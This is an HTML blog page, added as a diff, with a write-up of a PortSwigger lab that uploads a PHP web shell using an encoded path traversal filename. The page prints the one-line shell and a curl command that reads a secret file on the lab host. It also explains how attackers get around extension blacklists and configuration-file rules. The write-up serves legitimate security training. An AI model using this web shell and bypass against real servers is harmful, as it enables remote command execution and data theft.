@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web shell upload via Path Traversal [PortSwigger Lab] - G.R</title>
+<meta name="description" content="This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
+To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.">
+<meta name="author" content="Giorgi Rcheulishvili">
+<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/">
+
+
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/pygments.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a href="/" class="navbar-brand">G.R</a>
+    </div>
+    <div class="collapse navbar-collapse navbar-ex1-collapse">
+      <ul class="nav navbar-nav">
+        
+          
+          <li><a href="/research/">Research</a></li>
+        
+          
+          <li><a href="/projects/">Projects</a></li>
+        
+          
+          <li class="active"><a href="/archive/">Archive</a></li>
+        
+          
+          <li><a href="/about/">About</a></li>
+        
+          
+          <li><a href="/manifesto/">Approach</a></li>
+        
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            
+            
+            
+            
+            
+            
+            <li class="active"><a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/" hreflang="en">EN</a></li>
+          
+            
+            
+            
+            
+            
+            
+              
+                
+                  
+                
+              
+              
+            
+            <li><a href="/ka/untranslated/?from=%2Farchive%2Fnotes%2F1-web-applications%2F1f-file-upload-vulnerabilities%2F1f3-web-shell-upload-via-path-traversal-portswigger-lab%2F&amp;t=Web&#43;shell&#43;upload&#43;via&#43;Path&#43;Traversal&#43;%5BPortSwigger&#43;Lab%5D" hreflang="ka">ქარ</a></li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-sm-9">
+      
+<ol class="breadcrumb">
+  <li><a href="/"><i class="fa fa-home"></i></a></li>
+  
+  <li><a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/">File Upload Vulnerabilities</a></li>
+  
+  <li class="active">Web shell upload via Path Traversal [PortSwigger Lab]</li>
+</ol>
+
+      
+
+<article>
+  <header class="page-header">
+    <h1>Web shell upload via Path Traversal [PortSwigger Lab]</h1>
+  </header>
+
+  
+  <div class="panel panel-default">
+    <div class="panel-body post-info">
+      <span class="label label-success">2 min read</span>
+      
+      <span class="label label-default">Date</span>
+      <span class="published"><i class="fa fa-calendar"></i> <time datetime="2024-07-09">July 9, 2024</time></span>
+      
+      
+      <span class="label label-default">Category</span>
+      <a href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/">File Upload Vulnerabilities</a>
+      
+      
+    </div>
+  </div>
+  
+
+  <div class="entry-content">
+    <p>This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.</p>
+<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+<h3 id="solution">Solution:</h3>
+<p>So, User&rsquo;s page includes avatar upload function. just to upload <code>mal.php</code> with contents <code>&lt;?php echo system($_GET['command']); ?&gt;</code> will just return plaintext version of this script.</p>
+<figure><img src="/.gitbook/assets/Pasted%20image%2020240720173537.png">
+</figure>
+
+<p>it also seems that uploading <code>mal.php</code> with path traversal <code>../mal.php</code> still uploads it to <code>files/avatars/mal.php</code>, which means that it&rsquo;s cutting traversals in path.</p>
+<figure><img src="/.gitbook/assets/Pasted%20image%2020240720173821.png">
+</figure>
+
+<p>So all I had to do was obfuscating the path traversal to <code>..%2Fmal.php</code> which is same as <code>../mal.php</code>.</p>
+<p>after changing a filename to this parameter and uploading it we get the following response</p>
+<figure><img src="/.gitbook/assets/uploaded.png">
+</figure>
+
+<p>so the file is uploaded to <code>files/mal.php</code></p>
+<p>now we can just call this script using [[1a1b - cURL|cURL]] to get the response</p>
+<pre tabindex="0"><code>curl -X GET &#34;https://0a3c00e4049c901c802ee994009d003a.web-security-academy.net/files/mal.php?command=cat%20/home/carlos/secret&#34;
+
+
+jziR****************************jziR****************************
+</code></pre><p>The secret: jziR****************************</p>
+<hr>
+<p>Another obvious way to prevent users from uploading certain files is to blacklist these file extensions like <code>php</code>. This practice is still flawed since its difficult to explicitly blacklist every file that can be executed. such blacklists can be sometimes bypassed using lesser known, alternative file extensions like <code>.php5</code> or <code>.shtml</code> and so on.</p>
+<p>As previously mentioned, some servers won&rsquo;t let certain files to execute unless they are explicitly configured to do that.</p>
+<p>As an example, before Apache server lets PHP files to execute, a developer might put something like the following in their <code>/etc/apache2/apache2.conf</code> file:</p>
+<pre tabindex="0"><code>LoadModule php_module /usr/lib/apache2/modules/libphp.so
+	AddType application/x-httpd-php .php
+</code></pre><p>Many servers also allow developers to create special config-files within individual directories to override global configuration parameters. Apache-specific servers for example will load directory-specific configuration from a file called <code>.htaccess</code>.</p>
+<p>Similarly, directory-specific configuration can be made on IIS server using <code>web.config</code> file. This might include directives such as the following, where server only allows JSON files to be served to users:</p>
+<pre tabindex="0"><code>&lt;staticContent&gt; 
+	&lt;mimeMap fileExtension=&#34;.json&#34; mimeType=&#34;application/json&#34; /&gt; 
+	&lt;/staticContent&gt;
+</code></pre><p>Web servers use these kinds of configuration files when present, but you&rsquo;re not normally allowed to access them using HTTP requests.</p>
+<p>However, you may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable type.</p>
+
+  </div>
+</article>
+
+    </div>
+    <div class="col-sm-3" id="sidebar">
+      <aside>
+
+
+<div id="aboutme">
+  <p><img class="img-thumbnail" src="http://localhost:1313/images/logo.png" alt="Giorgi Rcheulishvili"></p>
+  <p><strong>About Me: Giorgi Rcheulishvili</strong><br>Systems and infrastructure engineering - automation, containerization, and offensive security.</p>
+</div>
+
+
+<section class="well well-sm">
+  <ul class="list-group">
+
+    
+    <li class="list-group-item">
+      <h4>Social</h4>
+      <a href="https://github.com/grcheulishvili" target="_blank" rel="noopener"><i class="fa fa-github-square fa-lg"></i></a> 
+      <a href="https://www.linkedin.com/in/giorgi-rcheulishvili-bba988260/" target="_blank" rel="noopener"><i class="fa fa-linkedin-square fa-lg"></i></a>
+    </li>
+    
+
+    
+    
+    <li class="list-group-item">
+      <h4>Recent Posts</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/about/">Technical Biography</a></li>
+        
+        <li class="list-group-item"><a href="/manifesto/">Engineering Philosophy</a></li>
+        
+        <li class="list-group-item"><a href="/research/building-a-polymorphic-engine/">Polymorphic Engine Development</a></li>
+        
+        <li class="list-group-item"><a href="/research/stack-mechanics-and-overflows/">The Mechanical Inevitability of Buffer Overflows</a></li>
+        
+        <li class="list-group-item"><a href="/archive/ssrf-exploitation/">Research: Server-Side Request Forgery (SSRF) Mechanics</a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Categories</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/research/">Research <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/archive/">Archives <span class="badge">18</span></a></li>
+        
+        <li class="list-group-item"><a href="/projects/">Projects <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/engineering/">Engineering <span class="badge">1</span></a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Tags</h4>
+      <div class="tag-cloud">
+        
+        <a href="/tags/assembly" class="tag-2">assembly</a>
+        
+        <a href="/tags/c2" class="tag-2">c2</a>
+        
+        <a href="/tags/ctfd" class="tag-2">ctfd</a>
+        
+        <a href="/tags/cti" class="tag-2">cti</a>
+        
+        <a href="/tags/databases" class="tag-2">databases</a>
+        
+        <a href="/tags/devsecops" class="tag-2">devsecops</a>
+        
+        <a href="/tags/docker" class="tag-2">docker</a>
+        
+        <a href="/tags/elk" class="tag-2">elk</a>
+        
+        <a href="/tags/engineering" class="tag-2">engineering</a>
+        
+        <a href="/tags/go" class="tag-2">go</a>
+        
+        <a href="/tags/grafana" class="tag-2">grafana</a>
+        
+        <a href="/tags/hardening" class="tag-2">hardening</a>
+        
+        <a href="/tags/infrastructure" class="tag-2">infrastructure</a>
+        
+        <a href="/tags/internals" class="tag-2">internals</a>
+        
+        <a href="/tags/linux" class="tag-2">linux</a>
+        
+        <a href="/tags/maldev" class="tag-2">maldev</a>
+        
+        <a href="/tags/monitoring" class="tag-2">monitoring</a>
+        
+        <a href="/tags/network-security" class="tag-2">network security</a>
+        
+        <a href="/tags/pentesting" class="tag-2">pentesting</a>
+        
+        <a href="/tags/portswigger" class="tag-2">portswigger</a>
+        
+        <a href="/tags/postgresql" class="tag-2">postgresql</a>
+        
+        <a href="/tags/python" class="tag-2">python</a>
+        
+        <a href="/tags/rce" class="tag-2">rce</a>
+        
+        <a href="/tags/red-team" class="tag-2">red team</a>
+        
+        <a href="/tags/research" class="tag-2">research</a>
+        
+        <a href="/tags/reverse-engineering" class="tag-2">reverse engineering</a>
+        
+        <a href="/tags/sqli" class="tag-2">sqli</a>
+        
+        <a href="/tags/ssrf" class="tag-2">ssrf</a>
+        
+        <a href="/tags/web-security" class="tag-2">web security</a>
+        
+      </div>
+    </li>
+    
+
+    
+    
+    
+    
+    <li class="list-group-item">
+      <h4>Archives</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item">2025</li>
+        
+        <li class="list-group-item">2024</li>
+        
+      </ul>
+    </li>
+    
+
+  </ul>
+</section>
+</aside>
+
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <hr>
+    <div class="row">
+      <div class="col-xs-10">
+        &copy; 2026 Giorgi Rcheulishvili
+        &middot; Powered by
+        <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>,
+        <a href="https://getbootstrap.com/docs/3.4/" target="_blank" rel="noopener">Bootstrap</a>,
+        theme styled after
+        <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank" rel="noopener">pelican-bootstrap3</a>
+      </div>
+      <div class="col-xs-2">
+        <p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+</body>
+</html>
